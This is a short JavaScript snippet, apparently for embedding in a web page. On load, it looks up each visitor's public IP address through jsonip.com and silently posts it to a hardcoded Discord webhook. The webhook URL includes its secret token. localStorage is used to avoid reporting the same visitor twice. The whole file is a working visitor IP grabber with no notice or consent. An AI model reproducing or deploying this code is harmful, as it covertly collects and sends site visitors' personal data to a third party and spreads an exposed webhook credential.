$(document).ready(function () {
	$.getJSON("http://jsonip.com/?callback=?", function (data) {
		console.log("Your IP Is: " + data.ip);
		postDataToWebhook(data.ip);
	});
});
function postDataToWebhook(data) {
	//get the values needed from the passed in json object
	var ip = data;
	var storedip = localStorage.getItem("UserIP")

	//url to your webhook
	var webHookUrl = "https://discordapp.com/api/webhooks/616002157908459539/Fbth7WJjqLnScBGVij8ttgxTMBn6l3mOEtRGZI5JO0PTOpVWa7CSSbYW-4l_HMVG_pvr";


	//https://developer.mozilla.org/en-US/docs/Web/API/XMLHttpRequest
	var oReq = new XMLHttpRequest();
	var myJSONStr = { "content": "New User IP Address: " + ip, "username": "Users IP Address", "avatar_url": "https://hunter-central-hub--thefalsegamer4.repl.co/webdev.png" };

	if (ip == storedip) {
		console.log("Same User")
	} else {
		//register method called after data has been sent method is executed
		oReq.addEventListener("load", reqListener);
		oReq.open("POST", webHookUrl, true);
		oReq.setRequestHeader('Content-Type', 'application/json');
		oReq.send(JSON.stringify(myJSONStr));
		localStorage.setItem("UserIP",ip);
	}
	

}
//callback method after webhook is executed
function reqListener() {
	console.log(this.responseText);
}
